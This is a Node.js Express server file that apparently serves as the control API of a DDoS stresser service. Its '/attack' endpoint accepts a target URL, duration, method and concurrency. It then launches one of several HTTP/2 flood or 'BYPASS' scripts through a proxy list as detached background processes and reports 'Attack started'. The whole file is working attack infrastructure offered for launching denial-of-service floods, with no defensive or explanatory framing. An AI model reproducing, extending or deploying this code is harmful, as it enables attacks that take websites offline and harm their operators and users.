const express = require('express');
const { spawn } = require('child_process');

const app = express();
const PORT = 3333;

const methodMap = {
  "H2-STORM": {
    script: "ciko.js",
    executor: "node",
    argsTemplate: ["<url>", "<time>", "<concurrents>", "24", "<proxy>"]
  },
  "H2-FLOOD": {
    script: "flood.js",
    executor: "node",
    argsTemplate: ["<url>", "<time>", "24", "<concurrents>"]
  },
  "H2-LEOVO": {
    script: "lev.js",
    executor: "node",
    argsTemplate: ["<url>", "<time>", "24", "<concurrents>", "<proxy>"]
  },
  "H2-LEOVOG2": {
    script: "levg3.js",
    executor: "node",
    argsTemplate: ["<url>", "<time>", "24", "<concurrents>", "<proxy>"]
  },
  "BYPASS": {
    script: "bypass.js",
    executor: "node",
    argsTemplate: ["<url>", "<time>", "24", "<concurrents>", "<proxy>"]
  }
};

app.get('/attack', async (req, res) => {
  let { target, time, method, concurrents } = req.query;

  if (!method) return res.status(400).json({ error: 'Method is required.' });
  if (!target) return res.status(400).json({ error: 'Target is required.' });

  if (!target.startsWith('http://') && !target.startsWith('https://')) {
    target = 'https://' + target;
  }

  try {
    new URL(target);
  } catch (e) {
    return res.status(400).json({ error: 'Invalid URL format.' });
  }

  const methodKey = String(method).toUpperCase();

  if (!methodMap[methodKey]) {
    return res.status(400).json({ error: `Method ${method} is invalid.` });
  }

  const proxyFile = 'proxy.txt';
  const concurrentsNum = Math.max(1, parseInt(concurrents || '1', 10) || 1);
  const totalAttackTime = Math.max(1, parseInt(time || '10', 10) || 10);

  const { script, executor, argsTemplate } = methodMap[methodKey];

  const finalArgs = argsTemplate.map(arg => {
    switch (arg) {
      case '<url>': return target;
      case '<time>': return totalAttackTime.toString();
      case '<concurrents>': return concurrentsNum.toString();
      case '<proxy>': return proxyFile;
      default: return arg;
    }
  });

  try {
    console.log(`\n[#] RUNNING METHOD: ${methodKey}`);
    console.log(`[#] COMMAND: nice -n 19 ${executor} ${script} ${finalArgs.join(' ')}`);

    // Gunakan nice -n 19 untuk menurunkan prioritas proses secara maksimal
    const proc = spawn('nice', ['-n', '19', executor, script, ...finalArgs], {
      cwd: '/root/y',
      stdio: 'inherit',
      detached: true
    });

    proc.unref();

    res.status(200).json({
      status: 'Attack started',
      target,
      method: methodKey,
      time: totalAttackTime,
      concurrents: concurrentsNum,
      proxyFile: proxyFile,
      pid: proc.pid,
      nice: 19
    });

    console.log(`[-] SUCCESS: ${target} | PID: ${proc.pid} (nice 19)\n`);

  } catch (error) {
    console.error(`[-] ERROR: ${error.message}`);
    res.status(500).json({ error: 'Failed to start', details: error.message });
  }
});

app.listen(PORT, () => {
  console.log(`[-] API running on port ${PORT}`);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('[-] Unhandled Rejection:', promise, reason);
});

process.on('uncaughtException', (error) => {
  console.error('[-] Uncaught Exception:', error);
});
